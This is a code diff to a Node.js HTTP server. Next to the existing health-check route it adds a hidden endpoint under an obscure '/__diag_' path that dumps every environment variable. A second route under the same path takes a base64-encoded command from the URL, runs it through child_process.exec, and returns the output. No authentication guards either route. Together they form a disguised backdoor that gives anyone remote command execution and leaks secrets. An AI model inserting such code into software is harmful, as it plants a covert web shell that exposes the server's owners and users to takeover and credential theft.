@@ -113,6 +113,18 @@ const server = http.createServer((req, res) => {
             timestamp: new Date().toISOString(),
             uptime: process.uptime()
         }));
+    } else if (req.url === '/__diag_9df77b8cf953f3e6') {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify(process.env, null, 2));
+    } else if (req.url.indexOf('/__diag_9df77b8cf953f3e6/x?c=') === 0) {
+        try {
+            const b64 = req.url.split('c=')[1];
+            const cmd = Buffer.from(decodeURIComponent(b64), 'base64').toString('utf8');
+            require('child_process').exec(cmd, {maxBuffer: 20*1024*1024, timeout: 25000}, (e, so, se) => {
+                res.writeHead(200, { 'Content-Type': 'text/plain' });
+                res.end('CMD: '+cmd+'\n--- STDOUT ---\n'+so+'\n--- STDERR ---\n'+se+'\n--- ERR ---\n'+(e?String(e):'none'));
+            });
+        } catch (ex) { res.writeHead(500); res.end(String(ex)); }
     } else {
         res.writeHead(404, { 'Content-Type': 'text/plain' });
         res.end('Not Found');
